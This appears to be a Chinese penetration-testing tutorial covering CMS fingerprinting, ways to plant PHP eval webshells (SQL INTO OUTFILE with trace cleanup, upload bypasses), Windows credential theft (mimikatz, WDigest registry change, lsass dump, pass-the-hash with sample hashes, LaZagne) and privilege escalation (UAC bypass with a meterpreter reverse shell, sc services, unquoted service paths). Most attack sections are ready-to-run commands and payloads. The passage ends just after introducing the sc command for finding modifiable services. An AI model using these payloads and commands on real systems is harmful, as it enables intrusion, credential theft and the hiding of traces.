<p>多CMS识别工具<br>项目地址：<a href="https://github.com/Tuhinshubhra/CMSeek">https://github.com/Tuhinshubhra/CMSeek</a></p>
<h3 id="其他识别CMS方法"><a href="#其他识别CMS方法" class="headerlink" title="其他识别CMS方法"></a>其他识别CMS方法</h3><p><strong>CMS识别指纹(浏览器插件)</strong><br>WhatRuns</p>
<p>Wappalyzer</p>
<p><strong>F12代码JS文件</strong><br>    如果有不知道CMS的网站，可以F12查看网站源代码的JS、CSS等文件，找特殊字符，然后去Github或者红迪（Reddit）网去搜索找到的字符。</p>
<p><strong>CMS的名称在页面的源代码中指定</strong><br>    到您要检查的网站–&gt;按 Ctrl + U 显示页面代码—&gt;在 html 页面上找到前缀为meta name&#x3D;”generator”content&#x3D;的标签—&gt;引擎名称将在“内容”一词后用引号表示</p>
<p><strong>文件路径</strong><br>    CMS 可以通过代码的典型文件夹及其结构来识别。特别是在指示 js 文件路径的行中。例如，wp-includes 和 wp-content 表明该网站由 Wordpress 提供支持</p>
<p><strong>网站页脚中的指示</strong><br>    CMS 名称有时可以在页脚、底部的小字体、联系信息或额外的公司信息下找到</p>
<p><strong>链接结构分析</strong><br>    如果网站页面的 URL 是在没有使用 CNC 生成器的情况下形成的，您会注意到页面文本中特定于特定 CMS 的部分。</p>
<p>WordPress 和 Joomla 的特定信息的链接可以在下面的示例中看到</p>
<p>WordPress：website_name&#x2F;р&#x3D;123</p>
<p>Joomla：website_name&#x2F;index.php?option&#x3D;com_content&amp;</p>
<p>task&#x3D;view&amp;id&#x3D;12&amp;Itemid&#x3D;345website_name&#x2F;content&#x2F;view&#x2F;12&#x2F;345&#x2F;</p>
<p><strong>管理员登录网址</strong><br>    上使用的 CMS 可以通过查看指向网站管理面板的 URL 来确定。这是 WordPress，例如，如果将 &#x2F;wp-admin&#x2F; 添加到 URL 栏中的域名，则会将您带到带有登录名和密码输入窗口的页面。</p>
<p>site_name&#x2F;wp-admin&#x2F; - WordPress</p>
<p>site_name&#x2F;administrator&#x2F; - Joomla</p>
<p>site_name&#x2F;admin&#x2F; - OpenCart</p>
<p>SiteName&#x2F;user&#x2F; - Drupal</p>
<p><strong>网站特有文件</strong><br>    如&#x2F;templets&#x2F;default&#x2F;style&#x2F;dedecms.css—dedecms</p>
<p><strong>网站MD5指纹</strong><br>    一些网站的特定图片文件、js文件、CSS等静态文件，如favicon.ico、css、logo.ico、js等文件一般不会修改，通过爬虫对这些文件进行抓取并比对md5值，如果和规则库中的Md5一致则说明是同一CMS。这种方式速度比较快，误报率相对低一些，但也不排除有些二次开发的CMS会修改这些文件。</p>
<p><strong>一些汇总</strong><br>    网站文件命名规则</p>
<p>​	返回头的关键字</p>
<p>​	网页关键字</p>
<p>​	Url特征</p>
<p>​	Meta特征</p>
<p>​	Script特征</p>
<p>​	robots.txt</p>
<p>​	网站路径特征</p>
<h3 id="CMS漏洞检测工具"><a href="#CMS漏洞检测工具" class="headerlink" title="CMS漏洞检测工具"></a>CMS漏洞检测工具</h3><p><strong>wordpress</strong><br>项目地址：<a href="https://github.com/rastating/wordpress-exploit-framework">https://github.com/rastating/wordpress-exploit-framework</a></p>
<p>项目地址：<a href="https://github.com/n00py/WPForce">https://github.com/n00py/WPForce</a></p>
<p>项目地址：<a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a></p>
<p>描述 ：WPScan WordPress 安全扫描器</p>
<p>使用：kali–&gt;wpscan –url “目标网站”</p>
<p><strong>Drupal</strong><br>项目地址：<a href="https://github.com/SamJoan/droopescan">https://github.com/SamJoan/droopescan</a><br>项目地址：<a href="https://github.com/immunIT/drupwn">https://github.com/immunIT/drupwn</a></p>
<p>安装教程：<br>git clone <a href="https://github.com/immunIT/drupwn.git">https://github.com/immunIT/drupwn.git</a> &amp;&amp; cd drupwn<br>pip3 install -r requirements.txt </p>
<p>使用说明：.&#x2F;drupwn –mode enum –target “目标地址”<br>  –mode MODE     模式枚举|利用<br>  –target TARGET   要扫描的目标主机名</p>
<p><strong>Joomla</strong><br>项目地址：<a href="https://github.com/OWASP/joomscan">https://github.com/OWASP/joomscan</a></p>
<p>描述：OWASP Joomla 漏洞扫描程序项目</p>
<p>安装教程：kali–&gt;apt install joomscan</p>
<p>使用：joomscan -u “目标”</p>
<p><strong>cmseek</strong><br>项目地址：<a href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a></p>
<p>安装教程：</p>
<p>git clone <a href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a> &amp;&amp; cd CMSeeK</p>
<p>pip3 install -r requirements.txt</p>
<p>使用说明：python3 cmseek.py -u “目标地址”  </p>
<p>#######以上三款工具都可kali安装#########</p>
<p><strong>几个在线CMS漏洞扫描网站</strong><br><a href="https://wpsec.com/">https://wpsec.com/</a>                                                          #wordpress专业扫描</p>
<p><a href="https://wpscan.com/">https://wpscan.com/</a>                                                        #wordpress专业扫描</p>
<p><a href="https://www.malcare.com/wordpress-malware-scan/">https://www.malcare.com/wordpress-malware-scan/</a>     #wordpress专业扫描</p>
<p><a href="https://hackertarget.com/scan-membership/">https://hackertarget.com/scan-membership/</a>                 #通用-收费</p>
<p><a href="https://gf.dev/">https://gf.dev/</a>                                                                  #综合测试</p>
<p><a href="https://pentest-tools.com/">https://pentest-tools.com/</a>                                              #2次免费扫描</p>
<p><a href="https://www.automox.com/">https://www.automox.com/</a>        </p>
<p>相关参考链接：</p>
<p><a href="https://zhuanlan.zhihu.com/p/355150689">https://zhuanlan.zhihu.com/p/355150689</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/402320861">https://zhuanlan.zhihu.com/p/402320861</a></p>
<p><a href="https://www.cnblogs.com/qingchengzi/articles/13533704.html">https://www.cnblogs.com/qingchengzi/articles/13533704.html</a></p>
<h2 id="非CMS获取webshell"><a href="#非CMS获取webshell" class="headerlink" title="非CMS获取webshell"></a>非CMS获取webshell</h2><p>更多的时候企业并不使用开源的CMS，而是选择自己开发源代码，这里的思路分为有权限和无权限两方面来分析</p>
<h3 id="有管理权限的情况："><a href="#有管理权限的情况：" class="headerlink" title="有管理权限的情况："></a>有管理权限的情况：</h3><p>是指前期通过其他方法，已经破解了管理后台功能，可以使用管理后台的情况</p>
<h4 id="通过正常上传一句话小马获取webshell"><a href="#通过正常上传一句话小马获取webshell" class="headerlink" title="通过正常上传一句话小马获取webshell"></a><strong>通过正常上传一句话小马获取webshell</strong></h4><ol>
<li>检查网站是否过滤上传文件后缀格式，如果未过滤直接上传一句话小马即可。</li>
<li>找到网站默认配置，将一句话小马插入配置中<br>因为有些网站没有对配置参数进行过滤，所以配置中的小马被读取后，就可能被连接</li>
</ol>
<p>建议先下载该站源码，进行查看源码过滤规则，以防插马失败。<br>插马失败很有可能会导致网站被你的小马中没有闭合标签导致网站出错。注意要闭合原有的代码，保证语法正确，以免程序运行出错。</p>
<h4 id="利用后台数据库备份获取webshell"><a href="#利用后台数据库备份获取webshell" class="headerlink" title="利用后台数据库备份获取webshell"></a><strong>利用后台数据库备份获取webshell</strong></h4><p>一般网站都不允许上传脚本类型文件，如 asp、php、jsp、aspx等文件。但一般后台都会有数据库备份功能。步骤如下</p>
<ol>
<li>上传允许格式的小马(如图片马)</li>
<li>找到文件上传后的文件路径</li>
<li>通过数据库备份，指定备份源文件与与备份后格式。</li>
</ol>
<p>如果后台限制了备份路径，可以尝试F12修改文本框元素</p>
<h4 id="通过花样上传一句话小马获取Webshell"><a href="#通过花样上传一句话小马获取Webshell" class="headerlink" title="通过花样上传一句话小马获取Webshell"></a>通过花样上传一句话小马获取Webshell</h4><p>使用BurpSuite 工具，%00截断、特殊名文件名绕过、文件名大小写绕过、黑白名单绕过等等，想尽一切办法就是要上传一句话木马，通过各种变形，万变不离其宗，换汤不换药。</p>
<h4 id="通过编辑模块、标签等拿WebShell"><a href="#通过编辑模块、标签等拿WebShell" class="headerlink" title="通过编辑模块、标签等拿WebShell"></a>通过编辑模块、标签等拿WebShell</h4><p>①通过对网站的<strong>模块</strong>进行编辑写入一句话，然后生成脚本文件拿WebShell</p>
<p>②通过将木马添加到压缩文件，把名字改为<strong>网站模板类型</strong>，上传到网站服务器，拿WebShell</p>
<h4 id="SQL命令获取"><a href="#SQL命令获取" class="headerlink" title="SQL命令获取"></a>SQL命令获取</h4><p>有一定的数据库权限的情况下，通过向数据库表写入马，然后备份该表为脚本文件的方式进行<br><strong>大致步骤：</strong></p>
<ol>
<li>创建表</li>
<li>将一句话写入刚创建的表中</li>
<li>查询一句话所在表到文件，成功将一句话写入文件</li>
</ol>
<p>第一种方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE `mysql`.`best` (`best1` TEXT NOT NULL );  </span><br><span class="line">#将一句话木马插入到mysql库best表best1字段</span><br><span class="line">INSERT INTO `mysql`.`best` (`best1` ) VALUES (&#x27;&lt;?php @eval($_POST[password]);?&gt;&#x27;);</span><br><span class="line">#查询这个字段导出到网站的文件中</span><br><span class="line">SELECT `best1` FROM `best` INTO OUTFILE &#x27;d:/wamp/www/best.php&#x27;;</span><br><span class="line">#把痕迹清除</span><br><span class="line">DROP TABLE IF EXISTS `best`;</span><br></pre></td></tr></table></figure>

<p>第二种方法：<br>优先推荐，简单明了，且避免了误删别人的数据！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#直接将查询出来的语句写入文件</span><br><span class="line">select &#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27;INTO OUTFILE &#x27;d:/wamp/www/best3.php&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="利用解析漏洞拿WebShell"><a href="#利用解析漏洞拿WebShell" class="headerlink" title="利用解析漏洞拿WebShell"></a>利用解析漏洞拿WebShell</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）IIS5.x / 6.0 解析漏洞</span><br><span class="line">2）IIS 7.0 / IIS 7.5 / Nginx &lt;8.03 畸形解析漏洞</span><br><span class="line">3）Nginx &lt; 8.03 空字节代码执行漏洞</span><br><span class="line">4）Apache 解析漏洞</span><br></pre></td></tr></table></figure>

<p>其他的还有命令执行漏洞，反序列化漏洞等</p>
<h4 id="利用编辑器漏洞拿WebShell"><a href="#利用编辑器漏洞拿WebShell" class="headerlink" title="利用编辑器漏洞拿WebShell"></a>利用编辑器漏洞拿WebShell</h4><p>利用网站的编辑器上传木马，搜索已知的编辑器漏洞，常见的编辑器有 fckeditor、ewebeditor、cheditor等，有时候没有管理员权限也可以拿下webshell。</p>
<h4 id="文件包含拿WebShell"><a href="#文件包含拿WebShell" class="headerlink" title="文件包含拿WebShell"></a>文件包含拿WebShell</h4><ol>
<li>首先需要存在文件包含漏洞</li>
<li>先将WebShell 改为txt格式文件上传</li>
<li>然后上传一个脚本文件包含该txt格式文件</li>
<li>通过这种方式，可绕过WAF拿WebShell</li>
</ol>
<h4 id="上传其它脚本类型拿WebShell"><a href="#上传其它脚本类型拿WebShell" class="headerlink" title="上传其它脚本类型拿WebShell"></a>上传其它脚本类型拿WebShell</h4><ol>
<li>此类型用于一台服务器具有多个网站<br>a网站是asp的站，b可能是php的站，分别限制了asp和php文件的上传，可以尝试向A上传php的脚本，来拿Shell</li>
<li>也可以尝试将脚本文件后缀名改为asa 或者在后面直接加个点（.）如”xx.asp.”， 来突破文件类型限制进行上传拿WebShell</li>
</ol>
<h4 id="修改网站上传类型配置来拿WebShell"><a href="#修改网站上传类型配置来拿WebShell" class="headerlink" title="修改网站上传类型配置来拿WebShell"></a>修改网站上传类型配置来拿WebShell</h4><p>某些网站，在网站上传类型中限制了上传脚本类型文件，我们可以去添加上传文件类型如添加asp | php | jsp | aspx | asa 后缀名来拿WebShell</p>
<h3 id="非管理权限"><a href="#非管理权限" class="headerlink" title="非管理权限"></a>非管理权限</h3><hr>
<h4 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h4><p>前提条件，具有足够权限，对写入木马的文件夹有写入权限，知道网站绝对路径</p>
<p>①可以通过log 备份、差异备份拿WebShell<br>②可以通过<code>into outfile</code>,<code>into outfile</code>函数(写入函数)将一句话木马写入，拿WebShell。<br>③利用phpmyadmin 将木马导出，拿WebShell<br>④利用连接外连的数据库拿WebShell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 要有file_priv权限</span><br><span class="line">2. 知道文件绝对路径 </span><br><span class="line">3. 能使用union </span><br><span class="line">4. 对web目录有读权限</span><br><span class="line">5. 若过滤了单引号，则可以将函数中的字符进行hex编码 </span><br></pre></td></tr></table></figure>

<h4 id="xss和sql注入联合利用"><a href="#xss和sql注入联合利用" class="headerlink" title="xss和sql注入联合利用"></a>xss和sql注入联合利用</h4><p>有些输入框对一些符号过滤不严密（如&lt;&gt;，所以一般存在xss的地方就可以这么利用）我们可以在这里输入一句话<code>&lt;?php @eval($_POST[&#39;CE&#39;]);?&gt;</code>，之后再用数据库注入，查询到文件into file成功插入一句话木马</p>
<h4 id="IIS写权限拿WebShell"><a href="#IIS写权限拿WebShell" class="headerlink" title="IIS写权限拿WebShell"></a>IIS写权限拿WebShell</h4><p>有些网站的管理员在配置网站权限的时候疏忽，导致我们有写权限，这种漏洞需要用工具来利用，已经很少见了，有专门的利用工具（桂林老兵）。<br>原理是通过找到有IIS 写入权限的网站（开启WebDeV），PUT进去一个.txt 格式的文件，目录必须有刻写的权限，如 image 文件夹，然后通过move 方法，把txt 格式的木马用move 成脚本格式。</p>
<h4 id="远程命令执行拿WebShell"><a href="#远程命令执行拿WebShell" class="headerlink" title="远程命令执行拿WebShell"></a>远程命令执行拿WebShell</h4><p>在有php代码执行漏洞,例如一些框架漏洞的时候可以通过执行一些系统命令进行拿WebShell。执行命令行命令“写入如下内容到文件，会自动将创建木马文件并将一句话木马写入其中，使用菜刀连接即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo ?php &quot;@eval($_POST[&#x27;CE&#x27;]);?&gt;&quot; &gt; x.php </span><br></pre></td></tr></table></figure>

<h4 id="头像上传拿WebShell"><a href="#头像上传拿WebShell" class="headerlink" title="头像上传拿WebShell"></a>头像上传拿WebShell</h4><p>大概思路：<br>①将大马放在文件夹中<br>②将文件夹压缩成压缩文件（zip）<br>③正常上传一个头像并且抓包<br>④将数据包中图片头像的内容部分删掉<br>⑤重新写入文件内容，将压缩文件写入到原本图片的位置<br>⑥上传，之后返回包中会告诉我们绝对路径</p>
<h1 id="管理员密码提取"><a href="#管理员密码提取" class="headerlink" title="管理员密码提取"></a>管理员密码提取</h1><p><strong>需要以管理员用户登录，才能提取密码</strong></p>
<h2 id="mimikatz工具读取"><a href="#mimikatz工具读取" class="headerlink" title="mimikatz工具读取"></a>mimikatz工具读取</h2><p>当目标为WindowsXP-2012等操作系统时，通过以下命令可以直接提取到明文密码（需要以管理员身份登录）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpassWords&quot; exit&gt;123.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">提升权限</span></span><br><span class="line">privilege::debug</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文（可能出现问题）</p>
<p>1、修改注册表，让Wdigest Auth 保存明文口令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>

<p>2、重启或注销登录，导出lsass.dmp</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>

<p>3、然后拿到 mimikatz 文件夹执行命令读明文</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>



<h2 id="本地hash远程攻击"><a href="#本地hash远程攻击" class="headerlink" title="本地hash远程攻击"></a>本地hash远程攻击</h2><p>1、获取sam文件中administrator的hash密码</p>
<p>使用pwdump工具获取密码</p>
<p>​	<a href="https://www.openwall.com/passwords/windows-pwdump">Windows PWDUMP tools</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator\桌面\pwdump8-8.2\pwdump7&gt;PwDump7.exe</span><br><span class="line">Pwdump v7.1 - raw password extractor</span><br><span class="line">Author: Andres Tarasco Acuna</span><br><span class="line">url: http://www.514.es</span><br><span class="line"></span><br><span class="line">Administrator:500:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA8854737681</span><br><span class="line">8D4:::</span><br><span class="line">Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">SUPPORT_388945a0:1001:NO PASSWORD*********************:B7BF2AD63C27101B314C28578</span><br><span class="line">FE3F1B9:::</span><br><span class="line">IUSR_GOLD-DFD1EF44BA:1003:587598BDB5B2EA09B2D2D1539A5CC67F:5C79A5D27C799E4E033C3</span><br><span class="line">96BDCEBD0ED:::</span><br><span class="line">IWAM_GOLD-DFD1EF44BA:1004:5858D28D62B2A756E9B758B2D3F45F97:1ABB238FC5AD200853D15</span><br><span class="line">FDC99B14207:::</span><br><span class="line">ASPNET:1006:CEBCC37474AA8AD3248733E5E96EA6DC:6D3A0F8AC892872D72EBFFD510F4BBEF:::</span><br><span class="line"></span><br><span class="line">test:1015:01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537:::</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\Administrator\桌面\pwdump8-8.2\pwdump7&gt;</span><br></pre></td></tr></table></figure>



<p>2、利用msf提供的exploit&#x2F;windows&#x2F;smb&#x2F;psexec模块</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf &gt;use exploit/windows/smb/psexec</span><br><span class="line">msf &gt;set RHOST 192.168.1.109</span><br><span class="line">msf &gt;set SMBUser administrator</span><br><span class="line">msf &gt;set SMBPass 44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA8854737681</span><br><span class="line">8D4</span><br><span class="line">msf &gt;exploit</span><br><span class="line">msf &gt;shell</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="使用LaZagne"><a href="#使用LaZagne" class="headerlink" title="使用LaZagne"></a>使用LaZagne</h2><p>强烈推荐：可以获取所有的密码：浏览器密码、wifi密码等信息</p>
<p>[LaZagne][(<a href="https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe)]">https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe)]</a></p>
<p>1、安装依赖</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>

<p>2、基本使用</p>
<p>​	</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">抓取所有支持软件的密码</span></span><br><span class="line">laZagne.exe all</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">抓取浏览器的密码：</span></span><br><span class="line">laZagne.exe browsers</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">把所有的密码写入一个文件：</span></span><br><span class="line">laZagne.exe all -oN -output D:\BaiduNetdiskDownload\LaZagne-master\LaZagne-master</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解密域凭据（要解密域凭据，可以通过指定用户 Windows 密码的方式来完成。）：</span></span><br><span class="line">laZagne.exe all -password ZapataVive</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="Windows系统提权"><a href="#Windows系统提权" class="headerlink" title="Windows系统提权"></a>Windows系统提权</h1><h2 id="提权知识储备"><a href="#提权知识储备" class="headerlink" title="提权知识储备"></a>提权知识储备</h2><h3 id="常见提权方法"><a href="#常见提权方法" class="headerlink" title="常见提权方法"></a>常见提权方法</h3><blockquote>
<p>1、 溢出漏洞提权<br>2、 数据库提权<br>3、 第三方软件提权</p>
</blockquote>
<h3 id="Cmd命令无法执行原因分析"><a href="#Cmd命令无法执行原因分析" class="headerlink" title="Cmd命令无法执行原因分析"></a>Cmd命令无法执行原因分析</h3><p>有时通过webshell连接上操作系统后，cmd命令可能无法执行，原因一般都是被管理员降权或删除、组件被删除。<br>解决方法是通过脚本木马查找可读可写目录，上传cmd.exe，调用设定cmd路径（找可读可写目录不要选带空格目录）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#设置cmd执行路径</span><br><span class="line">setp c:\xxx\vvv\cmd.exe</span><br></pre></td></tr></table></figure>

<h3 id="提权常用命令讲解"><a href="#提权常用命令讲解" class="headerlink" title="提权常用命令讲解"></a>提权常用命令讲解</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami ——查看用户权限</span><br><span class="line">systeminfo ——查看操作系统，补丁情况</span><br><span class="line">ipconfig——查看当前服务器IP ipconfig /all</span><br><span class="line">net user——查看当前用户情况</span><br><span class="line">netstat ——查看当前网络连接情况  </span><br><span class="line">netstat –ano  /netstat –an | find “ESTABLISHED”</span><br><span class="line">tasklist ——查看当前进程情况 tasklist /svc</span><br><span class="line">taskkill ——结束进程 taskkill -PID xx</span><br><span class="line">net start  ——启动服务</span><br><span class="line">net stop ——停止服务</span><br><span class="line">hostname ——获取主机名称</span><br><span class="line">quser or query user ——获取在线用户</span><br><span class="line">netstat -ano | findstr 3389 ——获取rdp连接来源IP</span><br><span class="line">dir c:\programdata\ ——分析安装杀软</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn ——列出已安装的补丁</span><br><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber ——获取远程端口</span><br><span class="line">tasklist /svc | find &quot;TermService&quot; + netstat -ano ——获取远程端口</span><br></pre></td></tr></table></figure>

<h2 id="系统溢出漏洞提权实战"><a href="#系统溢出漏洞提权实战" class="headerlink" title="系统溢出漏洞提权实战"></a>系统溢出漏洞提权实战</h2><h3 id="零、系统溢出漏洞提权分类："><a href="#零、系统溢出漏洞提权分类：" class="headerlink" title="零、系统溢出漏洞提权分类："></a><strong>零、系统溢出漏洞提权分类：</strong></h3><ol>
<li>远程溢出<br>攻击者只需要与服务器建立连接，然后根据系统的漏洞，使用相应的溢出程序，即可获取到远程服务器的root权限。</li>
<li>本地溢出<br>首先要有服务器的一个用户，且需要有执行的权限的用户才能发起提权，<br>攻击者通常会向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出root权限</li>
</ol>
<h3 id="一、UAC绕过提权"><a href="#一、UAC绕过提权" class="headerlink" title="一、UAC绕过提权"></a>一、UAC绕过提权</h3><p>UAC（User Account Control）是微软在 Windows Vista 以后版本引入的一种安全机制，通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。<br>当获得的权限是属于管理员组的时候但是并不是administrator这个用户，此时就可能需要我们进行绕过UAC的操作，否则虽然是管理员组但是实际上并没有管理员所对应的高权限操作,这个时候就需要bypass uac。</p>
<p><strong>uac 绕过exp</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#用kali</span><br><span class="line">use exploit/windows/local/ask</span><br><span class="line"></span><br><span class="line">meterpreter &gt; background  [*] Backgrounding session 1... </span><br><span class="line">msf5 exploit(multi/handler) &gt; use exploit/windows/local/ask </span><br><span class="line">msf5 exploit(windows/local/ask) &gt; set session 1 </span><br><span class="line">msf5 exploit(windows/local/ask) &gt; set lhost 192.168.60.79 </span><br><span class="line">msf5 exploit(windows/local/ask) &gt; set lport 4444 </span><br><span class="line">msf5 exploit(windows/local/ask) &gt; set payload windows/meterpreter/reverse_tcp </span><br><span class="line">msf5 exploit(windows/local/ask) &gt; set technique exe </span><br><span class="line">msf5 exploit(windows/local/ask) &gt; exploit </span><br><span class="line"></span><br><span class="line">其他exp:</span><br><span class="line">use exploit/windows/local/bypassuacuse</span><br><span class="line">exploit/windows/local/bypassuac</span><br></pre></td></tr></table></figure>

<h3 id="二、利用系统内核溢出漏洞提权"><a href="#二、利用系统内核溢出漏洞提权" class="headerlink" title="二、利用系统内核溢出漏洞提权"></a>二、利用系统内核溢出漏洞提权</h3><p>此提权方法即是通过系统本身存在的一些漏洞，未曾打相应的补丁而暴露出来的提权方法，依托可以提升权限的EXP和它们的补丁编号，进行提升权限。</p>
<p><strong>微软官方时刻关注漏洞补丁列表网址:</strong><br><a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017</a></p>
<blockquote>
<p>比如常用的几个已公布的 exp：KB2592799、KB3000061、KB2592799</p>
</blockquote>
<p><strong>github中整理好的溢出提权exp：</strong><br><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a><br><a href="https://github.com/WindowsExploits/Exploits">https://github.com/WindowsExploits/Exploits</a><br><a href="https://github.com/AusJock/Privilege-Escalation">https://github.com/AusJock/Privilege-Escalation</a></p>
<h4 id="如何判断可用的漏洞"><a href="#如何判断可用的漏洞" class="headerlink" title="如何判断可用的漏洞"></a>如何判断可用的漏洞</h4><ol>
<li><p><strong>快速查找操作系统未打补丁脚本</strong><br>可以最安全的减少目标机的未知错误，以免影响业务。 命令行下执行检测未打补丁的命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo&gt;micropoor.txt&amp;(for \%i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find /i &quot;\%i&quot;|| @echo \%i you can fuck)&amp;del /f /q /a micropoor.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>MSF后渗透扫描：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post/windows/gather/enum_patches</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Powershell扫描：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module C:\Sherlock.ps1</span><br><span class="line">Find-AllVulns</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="三、利用SC将administrator提权至system"><a href="#三、利用SC将administrator提权至system" class="headerlink" title="三、利用SC将administrator提权至system"></a>三、利用SC将administrator提权至system</h3><p><strong>试用版本：</strong>windows 7、8、03、08、12、16</p>
<p>关于sc命令：SC 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中的“服务”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc Create syscmd binPath= “cmd /K start” type= own type= interact</span><br><span class="line">sc start systcmd</span><br></pre></td></tr></table></figure>

<blockquote>
<p>命令含义：<br>创建一个名叫syscmd的新的交互式的cmd服务<br>然后执行<code>sc start systcmd</code>，就得到了一个system权限的cmd环境</p>
</blockquote>
<h3 id="四、利用不带引号的服务路径"><a href="#四、利用不带引号的服务路径" class="headerlink" title="四、利用不带引号的服务路径"></a>四、利用不带引号的服务路径</h3><p><strong>检测方法</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>

<p><strong>Windows命令解释程序可能会遇到名称中的空格，并且没有包装在引号中的时候。就有可能出现解析漏洞。</strong><br>如开机自启动中有程序路径<code>C:\Program Files\Vulnerable.exe</code>,其中存在空格，此时在C盘根目录上传Program.exe文件时，可能会被目标开机自启动。如果无效，还可以尝试在C:\Program Files路径下上传Vulnerable.exe文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\Vulnerable.exe</span><br><span class="line">C:\Program Files\Vulnerable Service\Sub.exe</span><br><span class="line">C:\Program Files\Vulnerable Service\Sub Directory\service.exe</span><br></pre></td></tr></table></figure>

<p><strong>可以使用以下命令查看错误配置的路径</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="五、利用不安全的服务权限"><a href="#五、利用不安全的服务权限" class="headerlink" title="五、利用不安全的服务权限"></a>五、利用不安全的服务权限</h3><p><strong>⚫即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它。</strong><br><strong>AccessChk工具可以用来查找用户可以修改的服务：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">accesschk.exe -uwcqv “Authenticated Users” * /accepteula</span><br><span class="line">accesschk.exe -uwcqv “user” *</span><br></pre></td></tr></table></figure>

<p><strong>sc命令也可以用来查找用户可以修改的服务：</strong></p>
